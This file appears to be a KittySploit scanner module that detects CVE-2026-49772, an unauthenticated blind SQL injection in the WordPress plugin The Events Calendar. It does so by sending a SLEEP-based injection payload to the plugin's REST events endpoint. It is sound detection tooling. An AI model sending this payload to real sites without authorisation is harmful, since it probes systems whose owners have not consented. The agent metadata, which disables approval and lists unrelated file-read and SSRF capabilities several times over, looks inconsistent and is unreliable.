#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress

_PLUGIN = "the-events-calendar"
_VULN_LOW = (6, 15, 12)
_VULN_HIGH = (6, 16, 2)
_EEA = (
    "I understand that this endpoint is experimental and may change in a future "
    "release without maintaining backward compatibility. I also understand that I "
    "am using this endpoint at my own risk, while support is not provided for it."
)


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WordPress The Events Calendar CVE-2026-49772 (SQLi)",
        "description": (
            "Detects CVE-2026-49772 in The Events Calendar 6.15.12–6.16.2: unauthenticated "
            "blind SQL injection via the order parameter on /wp-json/tec/v1/events."
        ),
        "author": ["Joshua van der Poll", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-49772",
        "references": [
            "https://github.com/joshuavanderpoll/CVE-2026-49772",
            "https://theeventscalendar.com/",
        ],
        "modules": [
            "exploits/multi/http/wordpress_events_calendar_cve_2026_49772_sqli",
        ],
        "tags": [
            "web",
            "scanner",
            "wordpress",
            "sqli",
            "the-events-calendar",
            "unauthenticated",
            "cve-2026-49772",
        ],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 6,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'file_read', 'from_detail': 'lfi_path'},
                                   {'capability': 'lfi_param', 'from_detail': 'lfi_param'},
                                   {'capability': 'ssrf_primitive', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    sleep_delay = OptFloat(3.0, "SLEEP seconds for the time-based check", required=False, advanced=True)
    require_version_match = OptBool(
        False,
        "Only report when readme version is in 6.15.12–6.16.2 (skip pure behaviour hits)",
        required=False,
        advanced=True,
    )

    def _wp_base(self) -> str:
        return self.wp_normalize_base_path(self.path)

    def _events_path(self, order: str) -> str:
        base = self._wp_base()
        query = urlencode({"orderby": "event_date", "order": order})
        prefix = base if base != "/" else ""
        return f"{prefix}/wp-json/tec/v1/events?{query}"

    def _events_get(self, order: str, timeout: float):
        t0 = time.perf_counter()
        response = self.http_request(
            method="GET",
            path=self._events_path(order),
            headers={"X-TEC-EEA": _EEA},
            allow_redirects=True,
            timeout=timeout,
        )
        elapsed = time.perf_counter() - t0
        return response, elapsed

    def _event_count(self, timeout: float):
        response, _ = self._events_get("ASC", timeout)
        if not response or response.status_code != 200:
            return None
        total = response.headers.get("X-WP-Total") or response.headers.get("x-wp-total")
        if total and str(total).isdigit():
            return int(total)
        return None

    def run(self):
        wp_base = self._wp_base()
        timeout = float(self.timeout or 15)
        delay = float(self.sleep_delay or 3.0)

        if not self.wp_rest_has_namespace("tec/v1", wp_base):
            return False

        version = self.wp_plugin_version(_PLUGIN, wp_base)
        version_in_range = None
        if version:
            version_in_range = self.wp_version_in_range(version, _VULN_LOW, _VULN_HIGH)
            if self.require_version_match and not version_in_range:
                return False

        event_count = self._event_count(timeout)
        if event_count is None:
            return False
        if event_count == 0:
            return False

        _, elapsed_a = self._events_get("ASC", timeout)
        _, elapsed_b = self._events_get("DESC", timeout)
        baseline = min(elapsed_a, elapsed_b)

        _, injected = self._events_get(
            f"ASC,(SELECT SLEEP({delay}))",
            max(timeout, delay + 5),
        )
        if injected - baseline < delay:
            return False

        reason_bits = [
            (
                f"ORDER BY injection delayed response by ~{delay}s "
                f"(baseline {baseline:.2f}s, injected {injected:.2f}s)"
            )
        ]
        if version:
            flag = "affected" if version_in_range else "outside declared range"
            reason_bits.append(f"plugin version {version} ({flag})")
        reason_bits.append(f"events visible: {event_count}")

        self.set_info(
            severity="high",
            cve="CVE-2026-49772",
            version=version or "unknown",
            service="wordpress",
            endpoint="/wp-json/tec/v1/events",
            reason="; ".join(reason_bits),
        )
        return True
